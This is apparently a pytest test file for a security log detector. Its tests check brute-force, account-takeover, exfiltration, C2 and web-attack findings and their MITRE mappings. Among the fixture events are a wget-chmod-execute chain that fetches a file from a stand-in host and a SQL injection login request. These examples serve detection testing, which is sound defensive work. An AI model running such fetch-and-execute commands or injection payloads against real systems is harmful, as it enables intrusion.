from analyzer.detector import detect
from analyzer.metrics import evaluate_findings


def event(line, timestamp, user="alice", ip="192.0.2.10", status="success", action="login"):
    return {"line": line, "timestamp": timestamp, "user": user, "ip": ip,
            "country": "UNKNOWN", "action": action, "status": status, "raw": ""}


def types(findings):
    return {finding["type"] for finding in findings}


def test_exactly_three_failures_trigger_brute_force():
    events = [event(index, f"2026-09-01T10:00:0{index}+00:00", status="failed") for index in range(1, 4)]
    findings = detect(events)
    assert "brute_force" in types(findings)
    assert next(item for item in findings if item["type"] == "brute_force")["mitre"]["technique_id"] == "T1110"


def test_two_failures_do_not_trigger_brute_force():
    events = [event(index, f"2026-09-01T10:00:0{index}+00:00", status="failed") for index in range(1, 3)]
    assert "brute_force" not in types(detect(events))


def test_success_after_failures_is_account_takeover():
    events = [event(index, f"2026-09-01T10:00:0{index}+00:00", status="failed") for index in range(1, 4)]
    events.append(event(4, "2026-09-01T10:01:00+00:00", status="success"))
    assert "account_takeover" in types(detect(events))


def test_escalates_double_brute_force_threshold():
    events = [event(index, f"2026-09-01T10:00:{index:02d}+00:00", status="failed") for index in range(1, 7)]
    assert "brute_force_escalated" in types(detect(events))


def test_flags_post_auth_download_execute_chain():
    events = [
        event(1, "2026-09-01T10:00:00+00:00", status="failed"),
        event(2, "2026-09-01T10:00:01+00:00", status="failed"),
        event(3, "2026-09-01T10:00:02+00:00", status="failed"),
        event(4, "2026-09-01T10:01:00+00:00", status="success"),
        {**event(5, "2026-09-01T10:01:30+00:00", action="privilege", status="alert"), "command": "wget http://example.test/p -O /tmp/p"},
        {**event(6, "2026-09-01T10:01:31+00:00", action="privilege", status="alert"), "command": "chmod +x /tmp/p"},
        {**event(7, "2026-09-01T10:01:32+00:00", action="privilege", status="alert"), "command": "/tmp/p"},
    ]
    findings = detect(events)
    assert "post_auth_download_execute" in types(findings)
    assert "privilege_escalation" not in types(findings)
    assert len([item for item in findings if item["type"] == "post_auth_download_execute"]) == 1
    assert {item["technique_id"] for item in next(item for item in findings if item["type"] == "post_auth_download_execute")["mitre_techniques"]} == {"T1105", "T1204"}


def test_alert_types_remain_distinct():
    events = [event(index, f"2026-09-01T10:00:{index:02d}+00:00", status="failed") for index in range(1, 7)]
    events.append(event(7, "2026-09-01T10:01:00+00:00", status="success"))
    detected_types = types(detect(events))
    assert {"brute_force", "brute_force_escalated", "account_takeover"} <= detected_types


def test_web_attack_is_mapped_to_t1190():
    web_event = event(1, "2026-09-01T10:00:00+00:00", action="GET", ip="192.0.2.5")
    web_event["request"] = "GET /login.php?user=' OR '1'='1 HTTP/1.1"
    findings = detect([web_event])
    assert "web_attack" in types(findings)
    assert next(item for item in findings if item["type"] == "web_attack")["mitre"]["technique_id"] == "T1190"


def test_user_baseline_flags_deviation():
    events = [event(index, f"2026-09-01T09:0{index}:00+00:00") for index in range(1, 4)]
    events.append(event(4, "2026-09-01T23:00:00+00:00"))
    assert "unusual_time" in types(detect(events))


def test_c2_and_exfiltration_are_distinct():
    c2 = event(1, "2026-09-01T10:00:00+00:00", action="c2", status="alert")
    exfil = event(2, "2026-09-01T10:01:00+00:00", action="data_transfer", status="alert")
    findings = detect([c2, exfil])
    assert "c2_beaconing" in types(findings)
    assert "data_exfiltration" in types(findings)


def test_metrics_use_true_negative_denominator():
    findings = [{"line": 1, "type": "brute_force"}]
    labels = [{"line": 1, "type": "brute_force"}]
    metrics = evaluate_findings(findings, labels, total_cases=10)
    assert metrics["false_positive_rate"] == 0.0


def test_new_uploaded_log_rules_generalize():
    from pathlib import Path

    from analyzer.parser import parse_log_file

    events, errors = parse_log_file(Path("tests/fixtures/sample_incident.log"))
    assert not errors
    detected_types = types(detect(events))
    assert {"post_auth_download_execute", "data_exfiltration", "network_scan", "c2_beaconing", "country_change", "web_attack"} <= detected_types


def test_circular_hour_diff_around_midnight():
    from analyzer.detector import circular_hour_diff
    assert circular_hour_diff(23.5, 0.5) == 1.0
    assert circular_hour_diff(0.5, 23.5) == 1.0
    assert circular_hour_diff(12.0, 12.0) == 0.0


def test_detects_multiple_brute_force_waves():
    # First wave at 08:00
    events = [event(index, f"2026-09-01T08:00:0{index}+00:00", status="failed") for index in range(1, 4)]
    # Second wave at 14:00
    events.extend([event(index + 10, f"2026-09-01T14:00:0{index}+00:00", status="failed") for index in range(1, 4)])
    findings = [f for f in detect(events) if f["type"] == "brute_force"]
    assert len(findings) == 2

